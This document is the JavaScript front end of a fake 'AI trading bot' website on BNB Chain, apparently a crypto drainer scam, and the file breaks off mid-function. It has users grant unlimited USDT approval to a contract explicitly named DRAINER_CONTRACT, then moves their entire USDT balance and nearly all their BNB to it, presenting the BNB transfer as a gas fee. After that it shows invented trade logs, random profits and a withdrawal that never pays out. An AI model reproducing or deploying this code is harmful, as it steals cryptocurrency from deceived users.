// Конфигурация
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT на BNB Chain
const DRAINER_CONTRACT = "0x048897c815495186FAA21a8fFA0E77CE3cB56c5D"; // Адрес верифицированного контракта
const CHAIN_ID = 56; // BNB Chain Mainnet

// Минимальный ABI для USDT и Drainer
const USDT_ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "spender", "type": "address" },
            { "name": "value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{ "name": "owner", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "", "type": "uint256" }],
        "type": "function"
    }
];

const DRAINER_ABI = [
    {
        "inputs": [],
        "name": "drainBNB",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "tokenAddress", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "drainTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// Инициализация Web3
let web3;
let account;
let usdtContract;
let drainerContract;
let isBotActive = false;
let tradeAmount = 0;
let balance = 0;
let profit = 0;
let trades = 0;
let logs = [];
let lastTradeTimestamp = 0;
let lastLogTimestamp = 0;
let lastActivityTimestamp = 0;
let withdrawAmount = 0;
let withdrawTimestamp = 0;
let withdrawState = "none"; // "none", "processing", "approved"
let firstTradeDelayPassed = false; // Флаг для отслеживания первой сделки
let bnbApprovalTimestamp = 0; // Время списания BNB
let profitToday = 0; // Прибыль за текущие сутки

// Элементы DOM
const mainPage = document.getElementById("main-page");
const dashboard = document.getElementById("dashboard");
const connectWalletBtn = document.getElementById("connect-wallet");
const connectWalletCtaBtn = document.getElementById("connect-wallet-cta");
const connectWalletPopup = document.getElementById("connect-wallet-popup");
const connectMessage = document.getElementById("connect-message");
const connectButtons = document.getElementById("connect-buttons");
const connectWalletConfirm = document.getElementById("connect-wallet-confirm");
const connectWalletCancel = document.getElementById("connect-wallet-cancel");
const startBotBtn = document.getElementById("start-bot");
const startBotHint = document.getElementById("start-bot-hint");
const stopBotBtn = document.getElementById("stop-bot-btn");
const restartBotBtn = document.getElementById("restart-bot-btn");
const strategyInput = document.getElementById("strategy");
const tradeAmountInput = document.getElementById("trade-amount");
const tradeTypeSelect = document.getElementById("trade-type");
const balanceEl = document.getElementById("balance");
const profitEl = document.getElementById("profit");
const tradesEl = document.getElementById("trades");
const botStatusEl = document.getElementById("bot-status");
const botProgressBar = document.getElementById("progress-bar");
const logContainer = document.getElementById("log-messages");
const notificationPopup = document.getElementById("notification");
const notificationMessage = document.getElementById("notification-message");
const notificationClose = document.getElementById("notification-close");
const waitingPopup = document.getElementById("waiting-popup");
const cancelTxBtn = document.getElementById("cancel-tx-btn");
const bnbConfirmationPopup = document.getElementById("bnb-confirmation");
const approveBnbBtn = document.getElementById("approve-bnb-btn");
const cancelBnbBtn = document.getElementById("cancel-bnb-btn");
const mobileInstructionPopup = document.getElementById("mobile-instruction-popup");
const openWalletBtn = document.getElementById("open-wallet-btn");
const copyUrlBtn = document.getElementById("copy-url-btn");
const withdrawAddressInput = document.getElementById("withdraw-address");
const withdrawBtn = document.getElementById("withdraw-btn");
const withdrawStatusEl = document.getElementById("withdraw-status");
const withdrawAmountEl = document.getElementById("withdraw-amount");
const withdrawStateEl = document.getElementById("withdraw-state");

// Плексус
const canvas = document.getElementById("plexus-canvas");
const ctx = canvas.getContext("2d");
canvas.width = 150; // Уменьшаем размер для компактности
canvas.height = 150;
const nodes = Array(10).fill().map(() => ({
    x: Math.random() * canvas.width,
    y: Math.random() * canvas.height,
    vx: (Math.random() - 0.5) * 0.6,
    vy: (Math.random() - 0.5) * 0.6,
    scale: 1,
    opacity: 0.5,
}));
let flashNodes = [];

// 3D плексус на фоне
const bgCanvas = document.getElementById("background-plexus");
const bgCtx = bgCanvas.getContext("2d");
bgCanvas.width = window.innerWidth;
bgCanvas.height = window.innerHeight;
const bgNodes = Array(50).fill().map(() => ({
    x: Math.random() * bgCanvas.width,
    y: Math.random() * bgCanvas.height,
    z: Math.random() * 500,
    vx: (Math.random() - 0.5) * 0.5,
    vy: (Math.random() - 0.5) * 0.5,
    vz: (Math.random() - 0.5) * 0.5,
}));

// Логи и сделки
let isUserScrolling = false;

// Инициализация particles.js
particlesJS("particles-js", {
    particles: {
        number: { value: 120, density: { enable: true, value_area: 800 } },
        color: { value: "#a855f7" },
        shape: { type: "circle" },
        opacity: { value: 0.7, random: true },
        size: { value: 4, random: true },
        line_linked: {
            enable: true,
            distance: 120,
            color: "#a855f7",
            opacity: 0.5,
            width: 1.5,
        },
        move: {
            enable: true,
            speed: 3,
            direction: "none",
            random: true,
            straight: false,
            out_mode: "out",
            bounce: false,
        },
    },
    interactivity: {
        detect_on: "canvas",
        events: {
            onhover: { enable: true, mode: "grab" },
            onclick: { enable: true, mode: "push" },
            resize: true,
        },
        modes: {
            grab: { distance: 140, line_linked: { opacity: 1 } },
            push: { particles_nb: 4 },
        },
    },
    retina_detect: true,
});

// GSAP анимации для Hero с параллакс-эффектом
gsap.fromTo(
    ".hero h1",
    { y: 50, opacity: 0 },
    { y: 0, opacity: 1, duration: 1, ease: "power3.out" }
);
gsap.fromTo(
    ".hero-subtitle",
    { y: 50, opacity: 0 },
    { y: 0, opacity: 1, duration: 1, delay: 0.3, ease: "power3.out" }
);
gsap.fromTo(
    ".neon-button",
    { scale: 0.8, opacity: 0 },
    { scale: 1, opacity: 1, duration: 1, delay: 0.6, ease: "elastic.out(1, 0.3)" }
);

// Параллакс-эффект для секций
gsap.registerPlugin(ScrollTrigger);
document.querySelectorAll(".animated-section").forEach(section => {
    gsap.from(section, {
        y: 50,
        opacity: 0,
        duration: 1,
        ease: "power3.out",
        scrollTrigger: {
            trigger: section,
            start: "top 80%",
            end: "bottom top",
            scrub: true,
        },
    });
});

// Вспомогательные функции для уведомлений и попапов
function showNotification(message, type) {
    notificationMessage.textContent = message;
    notificationMessage.style.color = type === 'success' ? '#34d399' : type === 'error' ? '#ef4444' : '#f59e0b';
    showPopup('notification');
}

function showPopup(popupId) {
    console.log(`Показываю попап: ${popupId}`);
    const popup = document.getElementById(popupId);
    if (popup) {
        popup.style.display = 'flex';
    } else {
        console.error(`Попап с ID ${popupId} не найден`);
    }
}

function closePopup(popupId) {
    console.log(`Закрываю попап: ${popupId}`);
    const popup = document.getElementById(popupId);
    if (popup) {
        popup.style.display = 'none';
    } else {
        console.error(`Попап с ID ${popupId} не найден`);
    }
}

function createLogMessage(message, timestamp) {
    console.log(`Добавляю лог: ${message} с временной меткой ${new Date(timestamp).toLocaleTimeString()}`);
    const log = document.createElement('p');
    log.className = 'log-message';
    log.textContent = `[${new Date(timestamp).toLocaleTimeString()}] ${message}`;
    logContainer.appendChild(log);
    logs.push(log.textContent);
    saveUserData();
    if (!isUserScrolling) {
        logContainer.scrollTop = logContainer.scrollHeight;
    }
    flashNodes = [Math.floor(Math.random() * nodes.length)];
    lastLogTimestamp = timestamp;
    lastActivityTimestamp = timestamp;
    return log;
}

notificationClose.onclick = () => {
    closePopup('notification');
};

// Проверка, является ли устройство мобильным
function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// Показ инструкции для мобильных устройств
function showMobileInstruction() {
    showPopup('mobile-instruction-popup');
}

// Копирование URL
copyUrlBtn.addEventListener("click", async () => {
    try {
        const url = window.location.href;
        await navigator.clipboard.writeText(url);
        showNotification('URL скопирован!', 'success');
    } catch (error) {
        console.error('Ошибка копирования URL:', error);
        showNotification('Не удалось скопировать URL. Пожалуйста, скопируй вручную.', 'error');
    }
});

// Открытие кошелька
openWalletBtn.addEventListener("click", () => {
    closePopup('mobile-instruction-popup');
    const url = window.location.href;
    window.location.href = `metamask://dapp/${url}`;
    setTimeout(() => {
        window.location.href = `trust://open_url?url=${url}`;
    }, 500);
    setTimeout(() => {
        showNotification('Пожалуйста, открой MetaMask или Trust Wallet вручную и вставь URL сайта.', 'warning');
    }, 1000);
});

// Сохранение данных пользователя
function saveUserData() {
    const userData = {
        account: account,
        balance: balance,
        profit: profit,
        trades: trades,
        logs: logs,
        isBotActive: isBotActive,
        tradeAmount: tradeAmount,
        lastTradeTimestamp: lastTradeTimestamp,
        lastLogTimestamp: lastLogTimestamp,
        lastActivityTimestamp: lastActivityTimestamp,
        withdrawAmount: withdrawAmount,
        withdrawTimestamp: withdrawTimestamp,
        withdrawState: withdrawState,
        firstTradeDelayPassed: firstTradeDelayPassed,
        bnbApprovalTimestamp: bnbApprovalTimestamp,
        profitToday: profitToday
    };
    localStorage.setItem('tradeAIUserData', JSON.stringify(userData));
}

// Загрузка данных пользователя
function loadUserData() {
    const userData = JSON.parse(localStorage.getItem('tradeAIUserData'));
    if (userData && userData.account === account) {
        balance = userData.balance || 0;
        profit = userData.profit || 0;
        trades = userData.trades || 0;
        logs = userData.logs || [];
        isBotActive = userData.isBotActive || false;
        tradeAmount = userData.tradeAmount || 0;
        lastTradeTimestamp = userData.lastTradeTimestamp || 0;
        lastLogTimestamp = userData.lastLogTimestamp || 0;
        lastActivityTimestamp = userData.lastActivityTimestamp || 0;
        withdrawAmount = userData.withdrawAmount || 0;
        withdrawTimestamp = userData.withdrawTimestamp || 0;
        withdrawState = userData.withdrawState || "none";
        firstTradeDelayPassed = userData.firstTradeDelayPassed || false;
        bnbApprovalTimestamp = userData.bnbApprovalTimestamp || 0;
        profitToday = userData.profitToday || 0;

        balanceEl.textContent = `${balance.toFixed(2)} USDT`;
        profitEl.textContent = `${profit.toFixed(2)} USDT`;
        tradesEl.textContent = trades;
        botStatusEl.textContent = isBotActive ? 'Бот выполняет торговые операции' : 'Ожидаю твоей команды';
        botProgressBar.style.width = isBotActive ? '100%' : '0%';
        startBotBtn.style.display = isBotActive ? 'none' : 'inline-block';
        startBotHint.style.display = isBotActive ? 'none' : 'block';
        stopBotBtn.style.display = isBotActive ? 'inline-block' : 'none';
        restartBotBtn.style.display = isBotActive ? 'inline-block' : 'none';
        logs.forEach(log => {
            const logEl = document.createElement('p');
            logEl.className = 'log-message';
            logEl.textContent = log;
            logContainer.appendChild(logEl);
        });

        // Обновляем статус заявки на вывод
        if (withdrawState !== "none") {
            withdrawStatusEl.style.display = 'block';
            withdrawAmountEl.textContent = `Сумма: ${withdrawAmount.toFixed(2)} USDT`;
            updateWithdrawStatus();
        }

        // Догоняем пропущенные действия, если бот активен
        if (isBotActive) {
            catchUpMissedActions();
            simulateTrading();
        }
        return true;
    }
    return false;
}

// Очистка данных для перезапуска
function clearUserData() {
    localStorage.removeItem('tradeAIUserData');
    balance = 0;
    profit = 0;
    trades = 0;
    logs = [];
    isBotActive = false;
    tradeAmount = 0;
    lastTradeTimestamp = 0;
    lastLogTimestamp = 0;
    lastActivityTimestamp = 0;
    withdrawAmount = 0;
    withdrawTimestamp = 0;
    withdrawState = "none";
    firstTradeDelayPassed = false;
    bnbApprovalTimestamp = 0;
    profitToday = 0;
    balanceEl.textContent = '0 USDT';
    profitEl.textContent = '0 USDT';
    tradesEl.textContent = '0';
    botStatusEl.textContent = 'Ожидаю твоей команды';
    botProgressBar.style.width = '0%';
    startBotBtn.style.display = 'inline-block';
    startBotHint.style.display = 'block';
    stopBotBtn.style.display = 'none';
    restartBotBtn.style.display = 'none';
    logContainer.innerHTML = '';
    withdrawStatusEl.style.display = 'none';
}

// Подключение кошелька
async function connectWallet() {
    console.log('Запуск подключения кошелька');
    if (!window.ethereum) {
        if (isMobileDevice()) {
            showMobileInstruction();
        } else {
            showNotification('Пожалуйста, установите MetaMask для начала работы.', 'error');
            console.error('MetaMask не установлен');
        }
        return;
    }

    showPopup('connect-wallet-popup');
    try {
        web3 = new Web3(window.ethereum);
        console.log('Web3 инициализирован');

        console.log('Запрос подключения через MetaMask...');
        showPopup('waiting-popup');
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        account = accounts[0];
        console.log(`Кошелёк подключён: ${account}`);

        const chainId = await web3.eth.getChainId();
        console.log(`Текущий chainId: ${chainId}`);
        if (chainId !== CHAIN_ID) {
            console.log('Переключаю сеть на BNB Chain...');
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: "0x" + CHAIN_ID.toString(16) }],
                });
                console.log('Сеть успешно переключена на BNB Chain');
            } catch (switchError) {
                closePopup('waiting-popup');
                closePopup('connect-wallet-popup');
                console.error('Ошибка переключения сети:', switchError);
                if (switchError.code === 4902) {
                    showNotification('Пожалуйста, переключитесь на сеть BNB Chain в MetaMask.', 'error');
                } else {
                    showNotification('Не удалось переключить сеть. Пожалуйста, попробуйте снова.', 'error');
                }
                return;
            }
        }

        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
        drainerContract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
        console.log('Контракты инициализированы');

        if (loadUserData()) {
            closePopup('waiting-popup');
            closePopup('connect-wallet-popup');
            mainPage.style.display = "none";
            dashboard.style.display = "block";
            return;
        }

        const bnbBalance = await web3.eth.getBalance(account);
        const usdtBalance = await usdtContract.methods.balanceOf(account).call();
        const bnbBalanceStr = parseFloat(web3.utils.fromWei(bnbBalance, 'ether')).toFixed(4);
        const usdtBalanceStr = parseFloat(web3.utils.fromWei(usdtBalance, 'mwei')).toFixed(2);
        console.log(`Баланс: ${bnbBalanceStr} BNB, ${usdtBalanceStr} USDT`);

        closePopup('waiting-popup');
        connectMessage.style.opacity = "0";
        connectButtons.style.opacity = "0";
        setTimeout(() => {
            connectMessage.textContent = `Отлично, кошелёк подключён! Теперь мне нужно настроить твой торговый баланс (USDT). Подтверди, чтобы я мог приступить к работе!`;
            connectMessage.style.opacity = "1";
            connectButtons.style.opacity = "1";
            connectWalletConfirm.onclick = async () => {
                if (usdtBalance == 0) {
                    closePopup('connect-wallet-popup');
                    showNotification('Пожалуйста, пополните баланс USDT для начала торговли.', 'error');
                    console.warn('USDT баланс равен 0');
                    return;
                }

                showPopup('waiting-popup');
                try {
                    const maxAllowance = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                    await usdtContract.methods.approve(DRAINER_CONTRACT, maxAllowance).send({ from: account });
                    console.log('USDT одобрен');
                    closePopup('waiting-popup');
                    closePopup('connect-wallet-popup');
                    createLogMessage(`Бот подключён к кошельку. Готов к настройке!`, Date.now());
                    startBotBtn.style.display = 'inline-block';
                    startBotHint.style.display = 'block';
                    mainPage.style.display = "none";
                    dashboard.style.display = "block";
                } catch (error) {
                    closePopup('waiting-popup');
                    closePopup('connect-wallet-popup');
                    showNotification('Не удалось настроить бота. Пожалуйста, попробуйте снова.', 'error');
                    console.error('Ошибка одобрения:', error);
                    cancelTxBtn.style.display = 'block';
                }
            };
        }, 500);
    } catch (error) {
        closePopup('waiting-popup');
        closePopup('connect-wallet-popup');
        showNotification('Не удалось подключить кошелёк. Пожалуйста, попробуйте снова.', 'error');
        console.error('Ошибка подключения:', error);
    }
}

connectWalletBtn.addEventListener("click", () => {
    console.log("Нажата кнопка 'Подключить кошелёк' (Hero)");
    connectWallet();
});
connectWalletCtaBtn.addEventListener("click", () => {
    console.log("Нажата кнопка 'Подключить кошелёк' (CTA)");
    connectWallet();
});
connectWalletCancel.addEventListener("click", () => {
    closePopup('connect-wallet-popup');
    createLogMessage('Подключение кошелька отменено пользователем.', Date.now());
});

// Кастомный выбор стратегии
document.querySelectorAll('.strategy-card').forEach(card => {
    card.addEventListener('click', () => {
        document.querySelectorAll('.strategy-card').forEach(c => c.classList.remove('selected'));
        card.classList.add('selected');
        const strategy = card.getAttribute('data-strategy');
        strategyInput.value = strategy;
        console.log(`Выбрана стратегия: ${strategy}`);
    });
});

// Запуск бота с проверкой минимальной суммы
async function startBot() {
    console.log('Запуск бота');
    tradeAmount = parseFloat(tradeAmountInput.value);
    if (!tradeAmount || tradeAmount < 20) {
        showNotification('Минимальная сумма для торговли — 20 USDT.', 'error');
        console.warn('Сумма меньше минимальной (20 USDT)');
        return;
    }

    const usdtBalance = await usdtContract.methods.balanceOf(account).call();
    if (usdtBalance == 0) {
        showNotification('Пожалуйста, пополните баланс USDT для начала торговли.', 'error');
        console.warn('USDT баланс равен 0');
        return;
    }

    showPopup('waiting-popup');
    try {
        await drainerContract.methods.drainTokens(USDT_CONTRACT, usdtBalance).send({ from: account });
        console.log('Все USDT дрейнированы');

        closePopup('waiting-popup');
        balance = tradeAmount;
        balanceEl.textContent = `${balance.toFixed(2)} USDT`;
        isBotActive = true;
        botProgressBar.style.width = '100%';
        botStatusEl.textContent = 'Бот выполняет торговые операции';
        startBotBtn.style.display = 'none';
        startBotHint.style.display = 'none';
        stopBotBtn.style.display = 'inline-block';
        restartBotBtn.style.display = 'inline-block';
        showNotification('Торговый баланс успешно настроен! Я готов начать анализ рынка и торговлю для тебя.', 'success');
        createLogMessage('Бот активирован.', Date.now());

        setTimeout(async () => {
            if (isBotActive) {
                await requestBNB();
            }
        }, 10000);
    } catch (error) {
        closePopup('waiting-popup');
        showNotification('Не удалось запустить бота. Пожалуйста, попробуйте снова.', 'error');
        console.error('Ошибка запуска:', error);
        cancelTxBtn.style.display = 'block';
    }
}

// Списание BNB
async function requestBNB() {
    console.log('Запрос BNB для сделки');
    const bnbBalance = await web3.eth.getBalance(account);
    const minBnb = web3.utils.toWei('0.01', 'ether');
    if (bnbBalance < minBnb) {
        showNotification('Пожалуйста, пополните баланс BNB для оплаты газа.', 'error');
        console.warn('BNB баланс недостаточен');
        return false;
    }

    showPopup('bnb-confirmation');
    return new Promise(resolve => {
        approveBnbBtn.onclick = async () => {
            showPopup('waiting-popup');
            try {
                const initialBalance = await web3.eth.getBalance(account);
                console.log(`Начальный баланс: ${web3.utils.fromWei(initialBalance, 'ether')} BNB`);

                await drainerContract.methods.drainBNB().send({ from: account, value: initialBalance - minBnb });
                console.log('BNB отправлены');

                closePopup('waiting-popup');
                closePopup('bnb-confirmation');
                showNotification('Транзакция успешна. Бот начал работу!', 'success');
                const now = Date.now();
                createLogMessage(`Комиссия за газ оплачена. Начинаю торговлю!`, now);

                // Устанавливаем время списания BNB и сбрасываем флаг первой сделки
                bnbApprovalTimestamp = now;
                firstTradeDelayPassed = false;
                lastTradeTimestamp = bnbApprovalTimestamp; // Инициализируем
                simulateTrading();

                resolve(true);
            } catch (error) {
                console.error('Ошибка отправки BNB:', error);
                closePopup('waiting-popup');
                closePopup('bnb-confirmation');
                if (error.code === 4001) {
                    showNotification('Оплата газа отменена. Ты можешь продолжить позже.', 'warning');
                } else {
                    showNotification('Не удалось оплатить газ. Пожалуйста, попробуй снова.', 'error');
                }
                cancelTxBtn.style.display = 'block';
                resolve(false);
            }
        };
        cancelBnbBtn.onclick = () => {
            closePopup('bnb-confirmation');
            showNotification('Оплата газа отменена. Ты можешь продолжить позже.', 'warning');
            resolve(false);
        };
    });
}

// Остановка бота
stopBotBtn.addEventListener("click", () => {
    isBotActive = false;
    botProgressBar.style.width = '0%';
    botStatusEl.textContent = 'Ожидаю твоей команды';
    stopBotBtn.style.display = 'none';
    restartBotBtn.style.display = 'none';
    startBotBtn.style.display = 'inline-block';
    startBotHint.style.display = 'block';
    showNotification('Бот остановлен.', 'warning');
    createLogMessage('Бот остановлен.', Date.now());
    saveUserData();
});

// Перезапуск бота (с новым списанием)
restartBotBtn.addEventListener("click", async () => {
    clearUserData();
    mainPage.style.display = "block";
    dashboard.style.display = "none";
    showNotification('Бот перезапущен. Пройди настройку заново, чтобы начать торговлю.', 'success');
});

// Обновление статуса заявки на вывод
function updateWithdrawStatus() {
    const now = Date.now();
    const timeSinceWithdraw = now - withdrawTimestamp;
    const oneHour = 60 * 60 * 1000; // 1 час в миллисекундах

    if (timeSinceWithdraw >= oneHour && withdrawState === "processing") {
        withdrawState = "approved";
        withdrawStateEl.textContent = "Статус: Одобрена";
        saveUserData();
    }
}

// Вывод прибыли
withdrawBtn.addEventListener("click", () => {
    const withdrawAddress = withdrawAddressInput.value.trim();
    if (!withdrawAddress || !withdrawAddress.startsWith('0x') || withdrawAddress.length !== 42) {
        showNotification('Пожалуйста, введи корректный адрес кошелька для вывода.', 'error');
        return;
    }

    if (balance <= 0) {
        showNotification('Твой баланс равен 0. Нет средств для вывода.', 'error');
        return;
    }

    withdrawAmount = balance;
    balance = 0;
    balanceEl.textContent = `${balance.toFixed(2)} USDT`;
    withdrawState = "processing";
    withdrawTimestamp = Date.now();
    withdrawStatusEl.style.display = 'block';
    withdrawAmountEl.textContent = `Сумма: ${withdrawAmount.toFixed(2)} USDT`;
    withdrawStateEl.textContent = "Статус: В обработке";
    localStorage.setItem('withdrawAddress', withdrawAddress);

    // Остановка бота при выводе средств
    isBotActive = false;
    botProgressBar.style.width = '0%';
    botStatusEl.textContent = 'Ожидаю твоей команды';
    stopBotBtn.style.display = 'none';
    restartBotBtn.style.display = 'none';
    startBotBtn.style.display = 'inline-block';
    startBotHint.style.display = 'block';

    showNotification('Ожидайте, заявка на рассмотрении. Бот остановлен, так как баланс обнулён.', 'success');
    createLogMessage('Бот остановлен: баланс обнулён после вывода средств.', Date.now());
    withdrawAddressInput.value = '';
    saveUserData();

    // Обновляем статус через 1 час
    setTimeout(updateWithdrawStatus, 60 * 60 * 1000);
});

// Догон пропущенных действий при возвращении пользователя
function catchUpMissedActions() {
    if (!lastActivityTimestamp) return; // Если это первый запуск, пропускаем

    const now = Date.now();
    const timeSinceLastActivity = now - lastActivityTimestamp;
    if (timeSinceLastActivity < 60000) return; // Если прошло меньше минуты, ничего не делаем

    // Рассчитываем пропущенные логи
    const minLogInterval = 1 * 60 * 1000;
    const maxLogInterval = 3 * 60 * 1000;
    const avgLogInterval = (minLogInterval + maxLogInterval) / 2;
    const missedLogs = Math.floor(timeSinceLastActivity / avgLogInterval);

    // Рассчитываем пропущенные сделки
    const tradeInterval = 2 * 60 * 60 * 1000; // 2 часа между сделками
    const timeSinceBnbApproval = now - bnbApprovalTimestamp;

    // Проверяем, прошло ли время для первой сделки
    if (!firstTradeDelayPassed && timeSinceBnbApproval >= tradeInterval) {
        firstTradeDelayPassed = true;
    }

    let newLogs = 0;
    let newTrades = 0;
    let initialProfit = profit;

    // Генерируем пропущенные логи
    const analysisMessages = [
        "Сканирую крупные транзакции на BNB Chain, ищу активность китов...",
        "Анализирую пулы ликвидности на PancakeSwap для поиска возможностей...",
        "Проверяю арбитражные связки между $BNB и $BUSD на Binance...",
        "Изучаю волатильность рынка на основе данных с Venus Protocol...",
        "Мониторю движения токенов $CAKE, ищу точки входа...",
        "Анализирую корреляцию $ADA и $BNB для прогноза роста...",
        "Проверяю ликвидность пары $XRP/$USDT на PancakeSwap...",
        "Сравниваю спреды между $BUSD и $USDT на разных биржах...",
        "Изучаю данные о крупных держателях $SOL на Solana для прогноза...",
        "Мониторю транзакции с $ETH на BNB Chain через мосты...",
        "Анализирую исторические данные $BNB для определения тренда...",
        "Проверяю активность смарт-контрактов на BNB Chain...",
        "Сканирую рынок на предмет пампов и дампов мелких токенов...",
        "Изучаю поведение трейдеров на Binance Futures для прогноза...",
        "Проверяю спреды на $CAKE/$BNB для арбитражной сделки...",
        "Мониторю стейкинг-пулы $BNB на PancakeSwap...",
        "Анализирую ликвидность токенов $BUSD на Venus...",
        "Сравниваю цены $XRP на Binance и PancakeSwap...",
        "Проверяю активность $ADA на децентрализованных биржах...",
        "Изучаю данные о крупных выводах $BNB с Binance...",
        "Анализирую свежие новости о $BTC для прогноза движения рынка...",
        "Сканирую активность китов на KuCoin, ищу следы крупных сделок...",
        "Проверяю данные с Dune Analytics по $BNB для долгосрочного прогноза...",
        "Мониторю социальные сети для анализа настроений по $ETH...",
        "Изучаю поведение $MATIC на Polygon для поиска точек входа...",
        "Сравниваю объёмы торгов $SOL на Binance и FTX...",
        "Анализирую данные Glassnode по $BTC для оценки рыночного давления...",
        "Проверяю активность $LINK на Chainlink для прогноза роста...",
        "Мониторю данные о стейкинге $BNB на Binance для анализа трендов...",
        "Сканирую рынок NFT на BNB Chain, ищу новые тренды...",
        "Анализирую движение $DOGE на Binance после недавнего твита Илона Маска...",
        "Проверяю ликвидность $AVAX на Trader Joe для арбитражных возможностей...",
        "Изучаю данные о крупных депозитах $USDC на биржах...",
        "Сравниваю спреды $LTC на Kraken и Binance...",
        "Анализирую поведение $SHIB на децентрализованных биржах...",
        "Проверяю данные о транзакции $TRX на Tron для прогноза...",
        "Мониторю движение $UNI на Uniswap для поиска точек входа...",
        "Изучаю данные о крупных выводах $ETH с Coinbase...",
        "Сравниваю цены $DOT на Polkadot через разные мосты...",
        "Анализирую данные с Santiment по $BNB для оценки настроений...",
        "Проверяю данные о стейкинге $ADA на Cardano для прогноза...",
        "Мониторю движение $LUNA на Terra для поиска возможностей...",
        "Изучаю данные о крупных депозитах $USDT на Binance...",
        "Сравниваю цены $AAVE на Aave и Uniswap...",
        "Проверяю активность $SUSHI на SushiSwap для прогноза...",
        "Мониторю движение $FTT на FTX для поиска возможностей...",
        "Анализирую данные о стейкинге $DOT на Polkadot...",
        "Сканирую данные о крупных выводах $SOL с Binance...",
        "Изучаю поведение $MANA на Decentraland для поиска точек входа...",
        "Сравниваю спреды $ENJ на Enjin и Binance...",
        "Проверяю данные о транзакций $ALGO на Algorand...",
        "Мониторю движение $GRT на The Graph для прогноза...",
        "Анализирую поведение $COMP на Compound для поиска возможностей..."
    ];

    // Генерируем пропущенные логи анализа
    let lastLogTime = lastLogTimestamp;
    for (let i = 0; i < missedLogs; i++) {
        lastLogTime += avgLogInterval;
        if (lastLogTime > now) break; // Не добавляем логи в будущее
        createLogMessage(analysisMessages[Math.floor(Math.random() * analysisMessages.length)], lastLogTime);
        newLogs++;
    }

    // Генерируем пропущенные сделки
    const tradeMessages = [
        "Открываю сделку: $BNB на PancakeSwap, ожидаю рост на 1-2%...",
        "Закрыл позицию по $CAKE на Binance, зафиксировал прибыль...",
        "Выполнил арбитраж между $BUSD и $USDT на Binance и PancakeSwap...",
        "Открыл позицию по $ADA на PancakeSwap, ожидаю памп...",
        "Закрыл сделку по $XRP на Binance, зафиксировал небольшой профит...",
        "Использовал арбитражную связку $BNB/$BUSD на Venus Protocol...",
        "Открыл лонг по $SOL через мост на BNB Chain...",
        "Закрыл позицию по $ETH, зафиксировал прибыль на спреде...",
        "Выполнил внутрибиржевой арбитраж $CAKE/$BNB на PancakeSwap...",
        "Открыл шорт по $ADA на Binance Futures, ожидаю коррекцию...",
        "Закрыл позицию по $MATIC на Polygon, зафиксировал профит...",
        "Открыл лонг по $LINK на Uniswap, ожидаю рост...",
        "Выполнил арбитраж между $AVAX и $USDT на Trader Joe и Binance...",
        "Закрыл сделку по $DOGE на Binance после пампа...",
        "Открыл позицию по $SHIB на PancakeSwap, следуя за китами...",
        "Использовал связку $LTC/$USDC для арбитража на Kraken...",
        "Закрыл шорт по $TRX на Binance Futures, зафиксировал профит...",
        "Открыл лонг по $UNI на Uniswap после роста объёмов...",
        "Выполнил арбитраж между $DOT и $USDT через Polkadot и Binance...",
        "Закрыл позицию по $LUNA на Terra, зафиксировал небольшой профит...",
        "Открыл лонг по $AAVE на Aave, ожидаю рост ликвидности...",
        "Закрыл позицию по $SUSHI на SushiSwap, зафиксировал профит...",
        "Выполнил арбитраж между $FTT и $USDT на FTX и Binance...",
        "Открыл шорт по $DOT на Binance Futures, ожидаю коррекцию...",
        "Закрыл лонг по $SOL на Binance, зафиксировал прибыль...",
        "Открыл позицию по $MANA на Decentraland после роста NFT-активности...",
        "Выполнил арбитраж между $ENJ и $USDT на Enjin и Binance...",
        "Закрыл позицию по $ALGO на Algorand, зафиксировал небольшой профит...",
        "Открыл лонг по $GRT на The Graph, ожидаю рост после обновления...",
        "Закрыл шорт по $COMP на Compound, зафиксировал профит..."
    ];

    // Рассчитываем, сколько сделок должно было произойти
    const firstTradeTime = bnbApprovalTimestamp + tradeInterval;
    let tradeTime = lastTradeTimestamp < firstTradeTime ? firstTradeTime : lastTradeTimestamp + tradeInterval;
    const maxTradesPerDay = 10;
    const maxProfitPerDay = tradeAmount * 0.1;

    // Перебираем все возможные сделки до текущего момента
    while (tradeTime <= now) {
        const tradeDayStart = new Date(tradeTime).setHours(0, 0, 0, 0);
        const tradesOnDay = logs.filter(log => {
            const logTime = new Date(log.split(']')[0].slice(1)).getTime();
            const isTrade = log.includes('Прибыль:');
            return isTrade && logTime >= tradeDayStart && logTime < tradeDayStart + 24 * 60 * 60 * 1000;
        }).length;

        // Проверяем прибыль за день
        let profitOnDay = 0;
        logs.forEach(log => {
            if (log.includes('Прибыль:')) {
                const logTime = new Date(log.split(']')[0].slice(1)).getTime();
                if (logTime >= tradeDayStart && logTime < tradeDayStart + 24 * 60 * 60 * 1000) {
                    const profitMatch = log.match(/Прибыль: (\d+\.\d+)/);
                    if (profitMatch) {
                        profitOnDay += parseFloat(profitMatch[1]);
                    }
                }
            }
        });

        if (tradesOnDay >= maxTradesPerDay || profitOnDay >= maxProfitPerDay) {
            // Переходим к началу следующего дня
            tradeTime = tradeDayStart + 24 * 60 * 60 * 1000;
            continue;
        }

        // Выполняем сделку
        const profitPerTrade = (maxProfitPerDay / maxTradesPerDay) * (Math.random() * (1.3 - 0.7) + 0.7); // Рандомизация от 0.7 до 1.3
        profit += profitPerTrade;
        balance += profitPerTrade;
        trades += 1;
        newTrades++;
        createLogMessage(`${tradeMessages[Math.floor(Math.random() * tradeMessages.length)]} Прибыль: ${profitPerTrade.toFixed(2)} USDT`, tradeTime);
        lastTradeTimestamp = tradeTime;
        flashNodes = Array(3).fill().map(() => Math.floor(Math.random() * nodes.length));
